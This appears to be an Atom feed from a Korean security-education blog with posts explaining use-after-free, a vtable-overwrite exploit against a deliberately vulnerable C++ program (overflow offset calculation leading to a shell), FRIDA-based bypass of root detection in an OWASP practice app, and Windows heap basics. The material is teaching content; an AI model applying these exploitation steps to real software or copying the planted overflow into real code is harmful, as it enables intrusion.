<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-05-06T20:42:10+09:00</updated><id>http://localhost:4000/</id><title type="html">LIN ARENA</title><subtitle>LIN ARENA Technology Blog</subtitle><entry><title type="html">Use After Free</title><link href="http://localhost:4000/windows-0x0c" rel="alternate" type="text/html" title="Use After Free" /><published>2019-05-06T20:18:00+09:00</published><updated>2019-05-06T20:18:00+09:00</updated><id>http://localhost:4000/windows-0x0c</id><content type="html" xml:base="http://localhost:4000/windows-0x0c">&lt;h1 id=&quot;0x0c-use-after-free&quot;&gt;0x0c Use After Free&lt;/h1&gt;

&lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;

&lt;p&gt;오늘은 Use After Free에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;what-is-use-after-free&quot;&gt;What is Use After Free?&lt;/h5&gt;

&lt;p&gt;Use After Free는 단어 그대로 Free된 Pointer를 사용했을 때 발생하는 취약점입니다.&lt;/p&gt;

&lt;p&gt;UAF를 설명할 때 주로 다음의 샘플 코드를 많이 이용하는데 UAF를 한 번에 잘 설명하고 있습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Object *obj = (Object *)malloc(sizeof(Object));
obj-&amp;gt;Method();
free(obj);		// Free
...
obj-&amp;gt;Method();	// Use
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위 코드의 첫 코드를 보면 malloc으로 Object의 크기만큼 Heap을 할당해주고 있습니다.&lt;/p&gt;

&lt;p&gt;그리고 세 번째 줄에서 할당했던 객체를 해제해주고 있죠.&lt;/p&gt;

&lt;p&gt;마지막 코드를 보시면, 이미 해제된 Pointer가 다시 사용되고 있는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;이처럼, Free된 후 해당 메모리를 가리키던 Pointer가 다시 사용될 때를 UAF 버그라고 이야기합니다.&lt;/p&gt;

&lt;p&gt;그런데..이거 가지고 뭘 할 수가 있지??&lt;/p&gt;

&lt;p&gt;그렇죠.. 아직 이 코드만 가지고는 명확한 이해가 안 될 수 있습니다.&lt;/p&gt;

&lt;p&gt;다음 예제를 가지고 조금 더 쉽게 설명해보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;uaf-example&quot;&gt;UAF Example&lt;/h5&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

typedef struct uaf {

	void (*vulnfunc)();

}uaf;

void good() {
	printf(&quot;I'm Joel\n&quot;);
}

void bad() {
	printf(&quot;I'm not Joel\n&quot;);
}

int main(int argc, char* cargv[]) {

	uaf * first = malloc(sizeof(uaf));
	uaf * second;

	first-&amp;gt;vulnfunc = good;
	first-&amp;gt;vulnfunc();

	free(first);

	second = malloc(sizeof(uaf));
	second-&amp;gt;vulnfunc = bad;
	
	first-&amp;gt;vulnfunc();

	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위 코드를 보면 먼저, first라는 객체에 uaf 크기만큼 Heap을 할당해주었습니다.&lt;/p&gt;

&lt;p&gt;그리고 vulnfunc에 good 함수의 주소를 넣어주었습니다.&lt;/p&gt;

&lt;p&gt;그럼 first-&amp;gt;vulnfunc();를 실행하게 되면 “I’m Joel”이라는 메시지가 출력되겠네요.&lt;/p&gt;

&lt;p&gt;여기까진 쉽죠??&lt;/p&gt;

&lt;p&gt;이후 first를 free 해줍니다.&lt;/p&gt;

&lt;p&gt;그리곤 second 객체를 생성하고 uaf 크기만큼 Heap을 할당해주었습니다.&lt;/p&gt;

&lt;p&gt;uaf 크기만큼 할당하고 해제한 뒤, 다시 uaf 크기만큼 할당하면 second는 first가 할당받았던 Heap과 동일한 영역을 할당받게 됩니다.&lt;/p&gt;

&lt;p&gt;지난 번 Heap 구조를 설명했던 것.. 기억하시나요?&lt;/p&gt;

&lt;p&gt;할당된 Heap을 해제하게 되면 Kernel로 바로 보내버리는 게 아니라, List에 넣어둔다고 했었죠?&lt;/p&gt;

&lt;p&gt;그런 다음 다시 동일한 크기의 Heap을 할당해달라고 요청하면 방금 해제된 영역을 재할당해줍니다.&lt;/p&gt;

&lt;p&gt;그럼 first가 해제된 다음 second를 요청하니까 second에는 first에 할당되었던 것과 동일한 영역이 할당되겠죠?&lt;/p&gt;

&lt;p&gt;지금까지 설명한 내용을 표현하자면 다음과 같이 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0c_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;다시 코드로 돌아가서, second의 vulnfunc에 bad 함수의 주소를 넣어주고 있습니다.&lt;/p&gt;

&lt;p&gt;마지막으로, 이미 해제된 Pointer를 요청합니다.&lt;/p&gt;

&lt;p&gt;first-&amp;gt;vulnfunc()를 호출하면 어떤 일이 생기게 될까요?&lt;/p&gt;

&lt;p&gt;second에 bad의 함수를 넣어뒀기 때문에 I’m not Joel이 호출되겠죠?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0c_2.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;실제 실행을 해보니 동일하게 구동이 되네요.&lt;/p&gt;

&lt;p&gt;지금까지 설명한 것을 중요 부분만 한 번 더 따라가 볼게요.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;uaf * first = malloc(sizeof(uaf));
first-&amp;gt;vulnfunc = good;
first-&amp;gt;vulnfunc();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;first 객체를 생성하고 uaf만큼 Heap을 할당해줍니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;free(first);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;그런 다음 free로 해제해줍니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;first-&amp;gt;vulnfunc();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;그리고 개발자의 부주의로 인해 이미 할당 해제된 Pointer가 재사용되고 있습니다.&lt;/p&gt;

&lt;p&gt;뭔가 감이 오시나요?&lt;/p&gt;

&lt;p&gt;해제와 재사용 사이에 second 객체 부분이 있었고, second는 first와 동일한 크기, 위치를 할당받았었죠?&lt;/p&gt;

&lt;p&gt;이 second 부분이 맨 처음 샘플 코드에서 … 부분인데, 이 부분에서 만약 shellcode의 주소로 바꿀 수 있다면 어떻게 될까요?&lt;/p&gt;

&lt;p&gt;first-&amp;gt;vulnfunc();가 구동되는 순간, Pointer가 가리키는 영역엔 shellcode의 주소가 있을 것이고…&lt;/p&gt;

&lt;p&gt;shellcode가 실행되겠죠?&lt;/p&gt;

&lt;p&gt;지금까지 설명한 내용이 UAF의 기본 개념입니다.&lt;/p&gt;

&lt;p&gt;UAF를 이용한 Exploit은 UAF의 절친 HeapSpray을 살펴본 후 진행할 예정이니까 그때까지만 기다려주세요 ㅎㅎ&lt;/p&gt;

&lt;p&gt;다음 글에서 뵙겠습니다!&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x0c Use After Free</summary></entry><entry><title type="html">Vtable Overwrite</title><link href="http://localhost:4000/windows-0x0b" rel="alternate" type="text/html" title="Vtable Overwrite" /><published>2019-04-18T20:18:00+09:00</published><updated>2019-04-18T20:18:00+09:00</updated><id>http://localhost:4000/windows-0x0b</id><content type="html" xml:base="http://localhost:4000/windows-0x0b">&lt;h1 id=&quot;0x0b-vtable-overwirte&quot;&gt;0x0b Vtable Overwirte&lt;/h1&gt;

&lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;

&lt;p&gt;오늘은 Vtable Overwrite에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;what-is-virtual-method&quot;&gt;What is Virtual Method?&lt;/h5&gt;

&lt;p&gt;Vtable에 대한 이해를 하기 위해서는 먼저, 가상함수가 무엇인지부터 알아야 합니다.&lt;/p&gt;

&lt;p&gt;여기서 상속, 다형성 등 모든 개념들을 다 살펴볼 수는 없습니다.&lt;/p&gt;

&lt;p&gt;간단히 필요 부분만 살펴보고 넘어갈 텐데, 모르는 부분은 직접 찾아서 공부해보시기 바랍니다.&lt;/p&gt;

&lt;p&gt;가상함수는 한마디로 다형성을 위해 씁니다.&lt;/p&gt;

&lt;p&gt;예를 들어 다음과 같은 클래스가 있다고 칩시다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

class Unit {
public:
	void Sound()
	{
		printf(&quot;Unit!\n&quot;);
	}

};

class Marine : public Unit {
public:
	void Sound() {
		printf(&quot;You wanna piece of me, boy?\n&quot;);
	}

};

class Firebat : public Unit {
public:
	void Sound() {
		printf(&quot;Need a light?\n&quot;);
	}

};

int main() {

	Unit * unit = new Unit;
	Marine * marine = new Marine;
	Firebat * firebat = new Firebat;

	unit-&amp;gt;Sound();

	unit = marine;
	unit-&amp;gt;Sound();

	unit = firebat;
	unit-&amp;gt;Sound();

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위와 같이 코드를 짜고 실행시키면 마린과 파이어뱃은 각자의 대사를 말할 것 같지만, 다음과 같이 출력됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;예상과는 다르죠?&lt;/p&gt;

&lt;p&gt;이번에는 다음과 같이 virtual 키워드를 사용하여 가상함수로 코드를 수정했습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

class Unit {
public:
	virtual void Sound()
	{
		printf(&quot;Unit!\n&quot;);
	}

};

class Marine : public Unit {
public:
	virtual void Sound() {
		printf(&quot;You wanna piece of me, boy?\n&quot;);
	}

};

class Firebat : public Unit {
public:
	virtual void Sound() {
		printf(&quot;Need a light?\n&quot;);
	}

};

int main() {

	Unit * unit = new Unit;
	Marine * marine = new Marine;
	Firebat * firebat = new Firebat;

	unit-&amp;gt;Sound();

	unit = marine;
	unit-&amp;gt;Sound();

	unit = firebat;
	unit-&amp;gt;Sound();

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이 코드를 실행하면 다음과 같이 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;virtual만 붙였을 뿐인데 처음 예상했던 대로 동작이 되네요.&lt;/p&gt;

&lt;p&gt;즉, 이 가상함수라는 것은 파생 클래스가 안전하게 재정의할 수 있는 것이라고 할 수 있습니다.&lt;/p&gt;

&lt;p&gt;이를 우리가 동적 바인딩이라고도 하는데, 동적 바인딩은 실행할 함수의 주소가 컴파일 시에 결정되는 것이 아니라, 포인터로 호출할 때 그 주소가 결정됩니다.&lt;/p&gt;

&lt;p&gt;좀 더 정확하게는 호출 시에 정해진다라기보다 컴파일 시에 미리 가상함수 테이블을 만들어두고 거기에 호출하고자 하는 함수를 넣어두는 형태입니다.&lt;/p&gt;

&lt;p&gt;이 가상함수 테이블이 바로 vtable입니다.&lt;/p&gt;

&lt;p&gt;그래서 실행이 되면 객체의 vtable을 찾아가서 호출할 함수의 번지를 찾아가는 로직이죠.&lt;/p&gt;

&lt;p&gt;지금까지 설명한 내용을 도식화하면 다음과 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이번엔 아래 코드를 가지고 vtable부터 overwrite를 살펴보도록 하겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;cstring&amp;gt;
#include &quot;windows.h&quot;
#include &amp;lt;iostream&amp;gt;

#pragma warning (disable:4996)
#define _CRT_SECURE_NO_WARNINGS
using namespace std;

class Book {
private:
	char name[100];
	int page;
public:
	Book(const char * _name, int _page) {
		strcpy(name, _name);
		page = _page;
	}
	virtual void setName(char * input) {
		char * buf = (char *)malloc(20);
		strncpy(buf, input, 19);
		printName(buf);
		getName();
	}
	virtual char * getName() {
		return name;
	}
	virtual void printName(char * buf) {
		printf(&quot;%s\n&quot;, buf);
	}

};

int main(int argc, char * argv[]) {

	static char contents[1000] = { 0, };
	static Book mybook(&quot;Windows_Hacking&quot;, 1);
	printf(&quot;object addr : 0x%08x\n&quot;, &amp;amp;mybook);
	printf(&quot;object vtable addr : 0x%08p\n&quot;, mybook);
	printf(&quot;buf addr : %08x\n&quot;, &amp;amp;contents);

	FILE * f = fopen(argv[1], &quot;r&quot;);
	fgets(contents, 1500, f);
	mybook.setName(contents);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;디버거로 vtable을 따라가 보도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_4.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;디버거로 쭉 따라가보면 0x004047D0에 객체가 생성된 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;그리고 그 객체에는 vtable의 주소가 들어있고 뒤 이어 “Windows_Hacking”이 담겨 있습니다.&lt;/p&gt;

&lt;p&gt;해당 주소에서 빨간색으로 표시해놓은 부분이 vtable의 주소입니다.&lt;/p&gt;

&lt;p&gt;더 따라가 봅시다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;vtable 시작 주소로 찾아간 모습입니다.&lt;/p&gt;

&lt;p&gt;여기에 보면 0x401040, 0x401080, 0x401090 등등 보이시죠? 얘들이 virtual method의 주소입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;[eax+8]이 call되는데 오른쪽에 eax를 보면 vtable을 가리키고 있는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;vtable에서 +8 위치는 0x00401090이 되겠네요.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_7.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 그림을 통해 확인해보면 0x00401090은 printfName이고 화면에 buf 값이 출력되겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_8.png&quot; alt=&quot;[그림 1-8]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;지금까지 vtable에 대해 알아봤고 공격 이야기로 넘어가볼게요.&lt;/p&gt;

&lt;h5 id=&quot;vtable-overwrite&quot;&gt;Vtable Overwrite?&lt;/h5&gt;

&lt;p&gt;이제 대충 vtable이라는 게 무엇인지는 알겠는데 공격은 어떻게 하겠다는 걸까요?&lt;/p&gt;

&lt;p&gt;공격 아이디어는 아까 전 위에서 살펴봤던 이 그림에 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_4.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;객체가 생성되었을 때의 주소와 값입니다.&lt;/p&gt;

&lt;p&gt;여기 첫 4바이트가 vtable의 주소라고 했었죠?&lt;/p&gt;

&lt;p&gt;만약 이 주소를 Shellcode가 있는 곳으로 바꿀 수가 있다면?&lt;/p&gt;

&lt;p&gt;네 맞습니다. 끝났어요. ㅎㅎ&lt;/p&gt;

&lt;p&gt;다만 주의해야 할 점이 객체의 vtable 값을 수정할 때는 shellcode가 들어있는 곳의 주소가 들어가야한다는 거죠.&lt;/p&gt;

&lt;p&gt;method가 실행되기까지의 과정을 생각해보시면 됩니다.&lt;/p&gt;

&lt;p&gt;객체에서 vtable 주소 -&amp;gt; vtable에서 함수의 주소 -&amp;gt; 실제 함수&lt;/p&gt;

&lt;p&gt;이런 식으로 따라가는 것이죠?&lt;/p&gt;

&lt;p&gt;그럼 우리는 다음과 같이 구성해야겠네요.&lt;/p&gt;

&lt;p&gt;객체에서 vtable 변조 -&amp;gt; 가짜 vtable (쉘 코드 주소) -&amp;gt; 쉘 코드&lt;/p&gt;

&lt;p&gt;자 그럼 실제로 overwrite를 진행해보도록 하겠습니다.&lt;/p&gt;

&lt;p&gt;먼저 얼마나 값을 넣어야 덮을 수 있을지 봐야겠네요?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_9.png&quot; alt=&quot;[그림 1-9]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;fgets로 버퍼에 값을 넣어주는 것을 따라가보면 0x004043E8에 AAAA를 넣고 있는 것을 알 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_10.png&quot; alt=&quot;[그림 1-10]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그리고 객체의 위치는 0x004047D8이네요.&lt;/p&gt;

&lt;p&gt;그럼 거리는 4047D8 - 4043E8 = 3F0 = 1008이네요.&lt;/p&gt;

&lt;p&gt;vtable 값도 덮어써야 하니까 총 거리는 1012!!&lt;/p&gt;

&lt;p&gt;거리도 알아냈으니 Payload를 작성해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_12.png&quot; alt=&quot;[그림 1-12]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Payload는 이렇게 작성했습니다.&lt;/p&gt;

&lt;p&gt;Payload 마지막 부분은 버퍼 시작 주소로 구성했고, 첫 부분은 fake function들로 구성했습니다.&lt;/p&gt;

&lt;p&gt;그런데 Payload를 보면 fake_vfunc 사이에 AAAA가 들어 있죠?&lt;/p&gt;

&lt;p&gt;이건 다음 코드를 보시면 이해가 가실겁니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_11.png&quot; alt=&quot;[그림 1-11]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;어셈블리어 코드를 보면 [eax+8] 위치의 함수를 호출하고 있죠?&lt;/p&gt;

&lt;p&gt;여기서 eax의 값은 우리가 변조한 버퍼의 시작주소입니다.&lt;/p&gt;

&lt;p&gt;그래서 버퍼 시작 주소에 +8 위치에 Shellcode 주소를 두었습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0b_13.png&quot; alt=&quot;[그림 1-13]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;짠! Shell이 잘 떨어지네요.&lt;/p&gt;

&lt;p&gt;지금까지 Vtable 개념과 공격 기법을 알아봤습니다.&lt;/p&gt;

&lt;p&gt;다음 시간에는 UAF와 HeapSpray를 알아볼 것이고, 버전별 IE exploit을 진행해보겟습니다.&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x0b Vtable Overwirte</summary></entry><entry><title type="html">android-0x02</title><link href="http://localhost:4000/android-0x02" rel="alternate" type="text/html" title="android-0x02" /><published>2019-04-12T14:00:00+09:00</published><updated>2019-04-12T14:00:00+09:00</updated><id>http://localhost:4000/android-0x02</id><content type="html" xml:base="http://localhost:4000/android-0x02">&lt;h1 id=&quot;android-동적-분석&quot;&gt;Android 동적 분석&lt;/h1&gt;

&lt;p&gt;안녕하세요 chaem 입니다.&lt;/p&gt;

&lt;p&gt;지난 포스팅에서 다루었던 Android 정적 분석에 이어서 이번에는 Android 동적 분석에 대해 포스팅 하려고 합니다.&lt;/p&gt;

&lt;p&gt;Android를 동적 분석하는 방법은 다양하지만 이번 포스팅에서는 FRIDA이용하는 방법에 대해 알아보겠습니다.&lt;/p&gt;

&lt;h4 id=&quot;frida&quot;&gt;FRIDA&lt;/h4&gt;
&lt;p&gt;FRIDA를 이용한 동적 분석은 Android 앱을 후킹하여 분석하는 방법입니다.&lt;/p&gt;

&lt;p&gt;분석 환경은 아래와 같습니다.&lt;/p&gt;

&lt;p&gt;OS : Window7&lt;/p&gt;

&lt;p&gt;Tools : FRIDA, frida-server, nox, adb, python, pip&lt;/p&gt;

&lt;p&gt;FRIDA를 사용하기 위해서는 python 및 pip가 설치되어있어야 하며,&lt;br /&gt;
아래와 같이 cmd에서 “pip install  frida” 명령어를 입력하여 FRIDA를 쉽게 설치할 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/01.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;FRIDA 설치 후 하기 링크에서 Android architecure에 맞는 frida-server를 다운로드합니다.&lt;/p&gt;

&lt;p&gt;https://github.com/frida/frida/releases&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/02.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

다운로드한 frida-server를 Android 기기에 설치하고 실행 권한 부여 후 실행시켜줍니다.
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/03.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;


아래 링크의 예제 앱을 이용해서 동적 분석을 진행하겠습니다.&lt;br /&gt;
https://github.com/OWASP/owasp-mstg/tree/master/Crackmes/Android&lt;br /&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/03-1.png&quot; alt=&quot;[그림 1-3-1]&quot; /&gt;
&lt;/figure&gt;
&lt;br /&gt;
  
앱을 실행하면 루팅을 탐지하게 되고, ok 버튼을 누르면 앱이 종료되는 것을 확인할 수 있습니다.  
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/04.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

앱이 종료되지 않도록 후킹 포인트를 찾기 위해 MainActivity를 확인해보겠습니다.&lt;br /&gt;
MainActivity를 살펴보면 ok 버튼을 누르면 System.exit(0)를 호출하는 것을 확인할 수 있습니다.

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/05.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

따라서 System.exit 함수가 호출될 때 해당 함수를 후킹해보도록 하겠습니다.&lt;br /&gt;
아래 python 코드를 이용해 후킹을 시도하면 ok 버튼을 눌러도 앱이 종료되지 않는 것을 확인할 수 있습니다.
 
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/06.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

이후 특정 문자열을 입력하여 인증하는 절차가 나옵니다.
아래와 같이 잘못된 문자열을 입력할 시 재시도하라는 메시지가 출력되고 있습니다.

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/07.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

특정 문자열 확인을 위해 아래 verify 함수를 확인해보면 인증 로직인 if(a.a(obj))을 확인할 수 있습니다.

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/08.png&quot; alt=&quot;[그림 1-8]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

sg.vantagepoint.uncrackable1.a class에서는 입력된 문자열과 암호를 복호화한 값과 비교하여 결과를 리턴하는 것을 확인할 수 있습니다.

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/09.png&quot; alt=&quot;[그림 1-9]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

마지막으로 sg.vantagepoint.a.a class의 a함수를 확인해보면 최종으로 복호화된 문자열을 리턴하는 것을 확인할 수 있습니다.

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/10.png&quot; alt=&quot;[그림 1-10]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

분석한 결과를 토대로 암호화된 특정 문자열을 복호화하여 출력하는 python 코드를 아래와 같이 작성해보았습니다.

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/11.png&quot; alt=&quot;[그림 1-11]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;

코드를 실행한 결과 복호화된 문자열을 확인할 수 있었고, 해당 문자열을 입력한 결과 성공이라는 메시지가 출력되는 것을 확인했습니다.

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/mobile/0x02/12.png&quot; alt=&quot;[그림 1-12]&quot; /&gt;
&lt;/figure&gt;
&lt;figure&gt;


지금까지 Android 동적 분석에 대해 알아보았고, 다음 포스팅에서는 SSL Pinning 우회 방법에 대해 알아보도록 하겠습니다.&lt;br /&gt;
&lt;br /&gt;
감사합니다.

&lt;/figure&gt;&lt;/figure&gt;&lt;/figure&gt;&lt;/figure&gt;&lt;/figure&gt;&lt;/figure&gt;&lt;/figure&gt;&lt;/figure&gt;&lt;/figure&gt;&lt;/figure&gt;</content><author><name>Chaem</name></author><category term="Posts" /><summary type="html">Android 동적 분석</summary></entry><entry><title type="html">Windows-Heap 정의</title><link href="http://localhost:4000/windows-0x0a" rel="alternate" type="text/html" title="Windows-Heap 정의" /><published>2019-04-02T20:18:00+09:00</published><updated>2019-04-02T20:18:00+09:00</updated><id>http://localhost:4000/windows-0x0a</id><content type="html" xml:base="http://localhost:4000/windows-0x0a">&lt;h1 id=&quot;0x0a-windows-heap&quot;&gt;0x0a Windows-Heap&lt;/h1&gt;

&lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;

&lt;p&gt;오늘부터는 Windows Heap에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;what-is-heap&quot;&gt;What is Heap?&lt;/h5&gt;

&lt;p&gt;Heap은 프로세스가 실행되는 동안 메모리를 필요한만큼 동적으로 할당하여 사용하는 영역입니다.&lt;/p&gt;

&lt;p&gt;그리고 c/c++에서는 malloc, new 함수를 사용하여 Heap 영역을 할당받아 사용합니다.&lt;/p&gt;

&lt;p&gt;윈도우에서는 힙을 이용할 수 있도록 API 함수들을 제공하고 있는데 대표적인 윈도우 힙 함수는 다음과 같습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;HeapCreate : 힙을 생성합니다.&lt;/li&gt;
  &lt;li&gt;HeapDestroy : 힙을 삭제합니다.&lt;/li&gt;
  &lt;li&gt;HeapAlloc : 힙 블록을 할당합니다.&lt;/li&gt;
  &lt;li&gt;HeapFree : 할당된 힙 블록을 해제합니다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이 정도는 이미 알고 계실거라 생각합니다.&lt;/p&gt;

&lt;p&gt;그럼 조금만 더 상세하게 알아볼게요.&lt;/p&gt;

&lt;h5 id=&quot;process-heap&quot;&gt;Process Heap&lt;/h5&gt;

&lt;p&gt;Process가 시작되면 최소한 하나의 기본 Process Heap(또는 Default Heap)이 생성됩니다.&lt;/p&gt;

